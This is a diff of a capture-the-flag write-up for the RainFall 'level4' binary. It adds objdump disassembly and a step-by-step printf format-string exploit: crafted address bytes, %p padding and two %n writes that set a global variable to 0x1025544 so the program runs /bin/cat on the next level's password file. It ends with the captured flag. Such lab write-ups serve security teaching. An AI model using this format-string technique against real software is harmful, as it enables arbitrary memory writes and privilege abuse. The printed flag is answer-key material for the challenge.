@@ -1,41 +1,94 @@
-|           0x08048457      push ebp
-|           0x08048458      ebp = esp
-|           0x0804845a      esp -= 0x218
-|           0x08048460      eax = dword [obj.stdin]
-|           0x08048465      dword [stream] = eax                       ; FILE *stream
-|           0x08048469      dword [size] = 0x200                       ; 512 ; int size
-|           0x08048471      eax = [s]
-|           0x08048477      dword [esp] = eax                          ; char *s
-|           0x0804847a      sym.imp.fgets ()                           ; char *fgets(char *s, int size, FILE *stream)
-|           0x0804847f      eax = [s]
-|           0x08048485      dword [esp] = eax
-|           0x08048488      sym.p ()
-|           0x0804848d      eax = dword [obj.m]			       ; 0x08049810
-|           0x08048492      var = eax - 0x1025544
-|       ,=< 0x08048497      if (var) goto 0x80484a5
-|       |   0x08048499      dword [esp] = str.bin_cat__home_user_level5_.pass ; 0x6e69622f ; "/bin/cat /home/user/level5/.pass" ; const char *string
-|       |   0x080484a0      sym.imp.system ()                          ; int system(const char *string)
+08048457 <n>:
+ 8048457:	55                   	push   ebp
+ 8048458:	89 e5                	mov    ebp,esp
+ 804845a:	81 ec 18 02 00 00    	sub    esp,0x218
+ 8048460:	a1 04 98 04 08       	mov    eax,ds:0x8049804				;stdin
+ 8048465:	89 44 24 08          	mov    DWORD PTR [esp+0x8],eax
+ 8048469:	c7 44 24 04 00 02 00 	mov    DWORD PTR [esp+0x4],0x200
+ 8048470:	00 
+ 8048471:	8d 85 f8 fd ff ff    	lea    eax,[ebp-0x208]
+ 8048477:	89 04 24             	mov    DWORD PTR [esp],eax
+ 804847a:	e8 d1 fe ff ff       	call   8048350 <fgets@plt>
+ 804847f:	8d 85 f8 fd ff ff    	lea    eax,[ebp-0x208]
+ 8048485:	89 04 24             	mov    DWORD PTR [esp],eax
+ 8048488:	e8 b7 ff ff ff       	call   8048444 <p>
+ 804848d:	a1 10 98 04 08       	mov    eax,ds:0x8049810				;int32_t m variable on bss
+ 8048492:	3d 44 55 02 01       	cmp    eax,0x1025544
+ 8048497:	75 0c                	jne    80484a5 <n+0x4e>
+ 8048499:	c7 04 24 90 85 04 08 	mov    DWORD PTR [esp],0x8048590	; "/bin/cat /home/user/level5/.pass"
+ 80484a0:	e8 bb fe ff ff       	call   8048360 <system@plt>
+ 80484a5:	c9                   	leave  
+ 80484a6:	c3                   	ret    
 
-/ (fcn) sym.p 19
-|   sym.p (char *format);
-|           ; arg char *format @ ebp+0x8
-|           0x08048444      push ebp
-|           0x08048445      ebp = esp
-|           0x08048447      esp -= 0x18
-|           0x0804844a      eax = dword [format]
-|           0x0804844d      dword [esp] = eax                          ; const char *format
-|           0x08048450      sym.imp.printf ()                          ; int printf(const char *format)
-
+08048444 <p>:
+ 8048444:	55                   	push   ebp
+ 8048445:	89 e5                	mov    ebp,esp
+ 8048447:	83 ec 18             	sub    esp,0x18
+ 804844a:	8b 45 08             	mov    eax,DWORD PTR [ebp+0x8]
+ 804844d:	89 04 24             	mov    DWORD PTR [esp],eax
+ 8048450:	e8 eb fe ff ff       	call   8048340 <printf@plt>
+ 8048455:	c9                   	leave  
+ 8048456:	c3                   	ret    
 
 This is almost the same exercice, same principle.
-We can see that an fgets is used to fill the `s` buffer which is then passed as argument to the function p.
+We can see that an fgets is used to fill the  buffer at $ebp-0x208 which is then passed as argument to the function p.
 Its argument is used as a format string for printf.
-There also is a check on the content at obj.m:
-we need obj.m to store a value of 0x1025544 to take the branch that contains the call to /bin/cat on the .pass file.
+There also is a check on the content at m:
+we need m to store a value of 0x1025544 to take the branch that contains the call to /bin/cat on the .pass file.
 So we are going to use a %n printf exploit.
 This time in two times, since we need to output n characters with printf before using %n to store the value n at the address passed as parameter to printf, by doing it in two times, we don't need to output 4 zillion of chars.
-There is a total of 48 bytes between the top of the stack and the start of the `s` buffer, therefor, popping 4 * 11 + 4 bytes will line up the injected addresses with the variadic argument list.
+There is a total of 48 bytes between the top of the stack and the start of the buffer, therefore, popping 4 * 11 + 4 bytes (the format string itself) will line up the format buffer with the variadic argument list.
 Since %n writes 4 bytes (an int) to the address, we need to start from the lower part of our value not to overwrite our first changes.
-we wrote a script that generates our file.
-./gen.sh && cat test - | ./level4
-we got our flag
+
+We divide 0x1025544 into 2 unsigned shorts: 0x5544 and 0x102
+level4@RainFall:~$ bc
+bc 1.06.95
+Copyright 1991-1994, 1997, 1998, 2000, 2004, 2006 Free Software Foundation, Inc.
+This is free software with ABSOLUTELY NO WARRANTY.
+For details type `warranty'. 
+obase=10
+ibase=16
+5544
+21828
+102
+258
+
+So 0x5544 = 21828 and 0x102 = 258. But 0x102 < 0x5544 and by the time we'll have printed 0x5544 chars, we won't be able to simply write 0x102 into memory. However since we'll write 0x102 at the 2 high value bytes of m, it implies that whatever is written after it is not taken into account. Meaning that if we write to memory a number of this form : 0xXXXX0102, we'll be fine. For example, 0x10102 would work:
+bc 1.06.95
+Copyright 1991-1994, 1997, 1998, 2000, 2004, 2006 Free Software Foundation, Inc.
+This is free software with ABSOLUTELY NO WARRANTY.
+For details type `warranty'. 
+obase=10
+ibase=16
+10102
+65794
+
+So 10102 = 65794 > 21828. To make it simple we'll pop all the arguments we can before printing all that padding, calculating how many chars have been printed so far, without the padding:
+/bin/echo -ne '\xAA\xAA\xAA\xAA' > /tmp/input # that's the argument of the first %d conversion  
+/bin/echo -ne '\x10\x98\x04\x08' >> /tmp/input # that's the argument of the first %n conversion 
+/bin/echo -ne '\xAA\xAA\xAA\xAA' >> /tmp/input # that's the argument of the second %d conversion
+/bin/echo -ne '\x12\x98\x04\x08' >> /tmp/input # that's the argument of the second %n conversion
+python -c 'import sys; sys.stdout.write("%p" * 11)' >> /tmp/input
+cat /tmp/input | ./level4 | wc -c 
+110
+
+110 have been printed: 21828 - 110 = 21718
+We need to print 21718 chars of padding, popping the first argument from the buffer, and write to memory (second):
+/bin/echo -ne '\xAA\xAA\xAA\xAA' > /tmp/input # that's the argument of the first %d conversion
+/bin/echo -ne '\x10\x98\x04\x08' >> /tmp/input # that's the argument of the first %n conversion
+/bin/echo -ne '\xAA\xAA\xAA\xAA' >> /tmp/input # that's the argument of the second %d conversion
+/bin/echo -ne '\x12\x98\x04\x08' >> /tmp/input # that's the argument of the second %n conversion
+python -c 'import sys; sys.stdout.write("%p" * 11); sys.stdout.write("%21718d%n")' >> /tmp/input
+cat /tmp/input | ./level4 | wc -c 
+21828 # And indeed that's the correct number of bytes printed
+
+Now we need to have 65794 chars printed: 65794 - 21828 = 43966
+We need to print 43966 chars of padding, popping the third argument from the buffer, and write to memory (fourth):
+/bin/echo -ne '\xAA\xAA\xAA\xAA' > /tmp/input # that's the argument of the first %d conversion
+/bin/echo -ne '\x10\x98\x04\x08' >> /tmp/input # that's the argument of the first %n conversion
+/bin/echo -ne '\xAA\xAA\xAA\xAA' >> /tmp/input # that's the argument of the second %d conversion
+/bin/echo -ne '\x12\x98\x04\x08' >> /tmp/input # that's the argument of the second %n conversion
+python -c 'import sys; sys.stdout.write("%p" * 11); sys.stdout.write("%21718d%n%43966d%n")' >> /tmp/input
+cat /tmp/input | ./level4                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+                                                                                                                                                                                                                                                       -1431655766level4@RainFall:~$
+And, we got our flag: 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
